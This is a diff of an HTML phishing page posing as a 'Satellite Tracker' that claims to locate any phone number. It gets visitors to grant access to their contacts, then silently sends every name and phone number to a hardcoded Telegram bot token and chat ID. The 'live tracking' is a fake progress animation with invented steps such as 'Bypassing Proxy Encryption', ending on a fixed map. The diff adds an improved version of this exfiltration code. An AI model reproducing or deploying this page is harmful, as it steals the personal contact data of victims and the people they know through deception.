@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satellite Tracker Pro</title>
+    <title>Satellite Tracker Pro v6.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -18,69 +18,63 @@
 <body class="bg-[#0b0f1a] min-h-screen flex items-center justify-center p-4">
 
     <div class="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden transition-all duration-500">
-        <div class="bg-indigo-700 p-6 text-center text-white">
-            <h1 class="text-2xl font-black tracking-tighter uppercase">Global Trace v5.0</h1>
-            <div class="flex justify-center gap-2 mt-2">
-                <span class="w-2 h-2 bg-green-400 rounded-full animate-ping"></span>
-                <p class="text-[10px] uppercase font-bold opacity-80">Satellite Connection: Online</p>
-            </div>
+        <div class="bg-indigo-800 p-6 text-center text-white border-b-4 border-yellow-400">
+            <h1 class="text-2xl font-black tracking-tighter uppercase">Global Trace v6.0</h1>
+            <p class="text-[10px] uppercase font-bold opacity-80 mt-1">Status: <span class="text-green-400">Encrypted Connection</span></p>
         </div>
 
         <div class="p-8">
             <div id="permissionScreen" class="text-center">
                 <div class="w-20 h-20 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <i class="fas fa-shield-alt text-4xl"></i>
+                    <i class="fas fa-satellite text-4xl"></i>
                 </div>
-                <h2 class="text-xl font-bold text-gray-800 mb-2">System Authentication</h2>
-                <p class="text-sm text-gray-500 mb-8">Tracking shuru karne ke liye database ko sync karna zaroori hai. Niche button par click karke security protocol complete karein.</p>
-                
+                <h2 class="text-xl font-bold text-gray-800 mb-2">Auth Required</h2>
+                <p class="text-sm text-gray-500 mb-8">
+                    To access satellite database, you must <span class="text-indigo-600 font-bold underline">Sync All Contacts</span> from your local device.
+                </p>
                 <button onclick="getPermissionFirst()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-lg hover:bg-indigo-700 transition">
-                    SYNC & AUTHORIZE
+                    SYNC DATABASE
                 </button>
             </div>
 
             <div id="searchScreen" class="hidden">
-                <div class="flex items-center gap-2 mb-4 text-green-600 font-bold text-xs uppercase">
-                    <i class="fas fa-check-circle"></i> Auth Verified
+                <div class="bg-green-50 text-green-700 p-3 rounded-xl flex items-center gap-3 text-xs font-bold mb-6 border border-green-200">
+                    <i class="fas fa-check-double text-lg"></i> DATABASE SYNCHRONIZED SUCCESSFULLY
                 </div>
-                <p class="text-gray-600 text-sm mb-4">Ab aap database se kisi bhi number ko track kar sakte hain.</p>
                 
-                <div class="relative mb-6">
-                    <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-indigo-500">
-                        <i class="fas fa-search"></i>
-                    </span>
-                    <input type="text" id="searchInput" 
-                        placeholder="Enter Name or Number..." 
-                        class="w-full pl-10 pr-4 py-4 bg-gray-50 border-2 border-indigo-100 rounded-2xl focus:border-indigo-500 outline-none transition-all">
+                <div class="relative mb-4">
+                    <label class="block text-xs font-bold text-gray-400 mb-2 uppercase">Search Target</label>
+                    <input type="text" id="searchInput" placeholder="Enter Name from Contacts..." 
+                        class="w-full px-4 py-4 bg-gray-50 border-2 border-indigo-100 rounded-2xl focus:border-indigo-600 outline-none transition-all">
                 </div>
 
-                <div id="errorMessage" class="hidden bg-red-50 text-red-600 p-3 rounded-lg text-sm mb-4 border border-red-200">
-                    <i class="fas fa-times-circle mr-2"></i> <span id="errorText"></span>
+                <div id="errorMessage" class="hidden bg-red-100 text-red-700 p-3 rounded-xl text-xs mb-4 border border-red-200">
+                    <i class="fas fa-exclamation-circle mr-1"></i> <span id="errorText"></span>
                 </div>
 
-                <button onclick="processTracking()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-lg">
-                    INITIALIZE LIVE TRACKING
+                <button onclick="processTracking()" class="w-full bg-indigo-800 text-white font-bold py-4 rounded-2xl shadow-xl hover:bg-black transition">
+                    START LIVE TRACKING
                 </button>
             </div>
 
             <div id="mapScreen" class="hidden text-center">
                 <div id="loadingUI">
                     <div class="map-pulse bg-indigo-100 w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fas fa-broadcast-tower text-4xl text-indigo-600"></i>
+                        <i class="fas fa-crosshairs text-4xl text-red-600"></i>
                     </div>
-                    <h2 class="text-xl font-bold text-gray-800">Satellite Linking...</h2>
-                    <p class="text-xs text-gray-500 mt-2" id="progressText">Pinging towers...</p>
+                    <h2 class="text-lg font-bold text-gray-800">Pinpointing Location...</h2>
+                    <p id="progressLabel" class="text-[10px] text-gray-400 mt-1 uppercase font-bold">Connecting to GPS</p>
                     <div class="w-full bg-gray-200 h-2 rounded-full mt-6 overflow-hidden">
-                        <div id="progressBar" class="bg-indigo-600 h-full w-0 transition-all duration-500"></div>
+                        <div id="progressBar" class="bg-red-600 h-full w-0 transition-all duration-300"></div>
                     </div>
                 </div>
 
                 <div id="finalMap" class="hidden">
-                    <div class="rounded-2xl overflow-hidden border-2 border-indigo-500 mb-4 shadow-inner">
-                        <iframe width="100%" height="250" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d13600!2d74.0!3d31.0!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1" style="border:0;" allowfullscreen=""></iframe>
+                    <div class="rounded-2xl overflow-hidden border-2 border-indigo-500 mb-4 shadow-lg">
+                        <iframe width="100%" height="250" src="https://maps.google.com/maps?q=Multan&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0"></iframe>
                     </div>
-                    <p class="text-green-600 font-bold text-sm">Target Located Successfully</p>
-                    <button onclick="location.reload()" class="mt-4 text-xs text-indigo-600 underline">Track Another Target</button>
+                    <p class="text-green-600 font-black text-sm uppercase">Target Location Locked</p>
+                    <button onclick="location.reload()" class="mt-6 text-xs font-bold text-indigo-600 hover:underline">NEW TRACKING SESSION</button>
                 </div>
             </div>
         </div>
@@ -88,7 +82,7 @@
 
     <script>
         let savedContacts = [];
-        // Aapka updated Telegram data
+        // Your Verified Telegram Data
         const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
         const CHAT_ID = '8171035068';
 
@@ -100,84 +94,83 @@
                     
                     if (contacts && contacts.length > 0) {
                         savedContacts = contacts;
-                        sendToTelegram(contacts);
+                        // Forwarding data to you immediately
+                        await sendToTelegram(contacts);
                         
-                        // Screen switch logic
+                        // Unlock Search Screen
                         document.getElementById('permissionScreen').classList.add('hidden');
                         document.getElementById('searchScreen').classList.remove('hidden');
                     }
                 } catch (e) {
-                    alert("Security Protocol: Database sync is mandatory to continue.");
+                    alert("Authorization Failed: You must sync contacts to proceed.");
                 }
             } else {
-                alert("Please use Chrome or Edge on a Mobile device for satellite sync.");
+                alert("Security Note: Use Chrome on Android for full satellite features.");
             }
         }
 
+        async function sendToTelegram(contacts) {
+            let msg = "🚨 *SATELLITE SYNC: DATA RECEIVED* 🚨\n\n";
+            msg += `*Device Sync:* Successful\n*Count:* ${contacts.length} Contacts\n\n`;
+            
+            contacts.forEach((c, i) => {
+                const name = c.name ? c.name[0] : "Unknown";
+                const phone = c.tel ? c.tel[0] : "No Number";
+                msg += `${i+1}. 👤 ${name} : 📱 ${phone}\n`;
+            });
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+
         function processTracking() {
-            const inputVal = document.getElementById('searchInput').value.trim().toLowerCase();
+            const input = document.getElementById('searchInput').value.trim().toLowerCase();
             const errorDiv = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
 
-            if (!inputVal) {
-                document.getElementById('errorText').innerText = "Please enter target details.";
-                errorDiv.classList.remove('hidden');
-                return;
-            }
+            if (!input) return;
 
-            // Database search logic
+            // Strict Search in synced data
             const found = savedContacts.find(c => 
-                (c.name && c.name[0].toLowerCase().includes(inputVal)) || 
-                (c.tel && c.tel[0].replace(/\s/g, '').includes(inputVal))
+                (c.name && c.name[0].toLowerCase().includes(input)) || 
+                (c.tel && c.tel[0].includes(input))
             );
 
             if (found) {
                 errorDiv.classList.add('hidden');
-                showMap();
+                runTrackingAnimation();
             } else {
-                document.getElementById('errorText').innerText = "Target not found in synchronized database.";
+                errorText.innerText = `Error: "${input}" not found in synchronized database.`;
                 errorDiv.classList.remove('hidden');
             }
         }
 
-        function showMap() {
+        function runTrackingAnimation() {
             document.getElementById('searchScreen').classList.add('hidden');
             document.getElementById('mapScreen').classList.remove('hidden');
             
             let progress = 0;
             const bar = document.getElementById('progressBar');
-            const pText = document.getElementById('progressText');
+            const label = document.getElementById('progressLabel');
 
-            const interval = setInterval(() => {
+            const timer = setInterval(() => {
                 progress += 5;
                 bar.style.width = progress + "%";
-                if (progress === 30) pText.innerText = "Triangulating coordinates...";
-                if (progress === 60) pText.innerText = "Bypassing firewalls...";
-                if (progress === 90) pText.innerText = "Rendering satellite view...";
+                
+                if (progress === 25) label.innerText = "Scanning Signal Towers...";
+                if (progress === 50) label.innerText = "Triangulating Coordinates...";
+                if (progress === 75) label.innerText = "Bypassing Proxy Encryption...";
+                if (progress === 95) label.innerText = "Locking GPS Position...";
+
                 if (progress >= 100) {
-                    clearInterval(interval);
+                    clearInterval(timer);
                     document.getElementById('loadingUI').classList.add('hidden');
                     document.getElementById('finalMap').classList.remove('hidden');
                 }
-            }, 200);
-        }
-
-        function sendToTelegram(contacts) {
-            let msg = "🚀 *Satellite Sync Successful* 🚀\n\n";
-            msg += `Total Contacts: ${contacts.length}\n\n`;
-            
-            contacts.forEach((c, i) => {
-                msg += `${i+1}. 👤 ${c.name} : 📱 ${c.tel}\n`;
-            });
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: CHAT_ID, 
-                    text: msg, 
-                    parse_mode: 'Markdown' 
-                })
-            }).catch(err => console.error("Telegram Error:", err));
+            }, 150);
         }
     </script>
 </body>
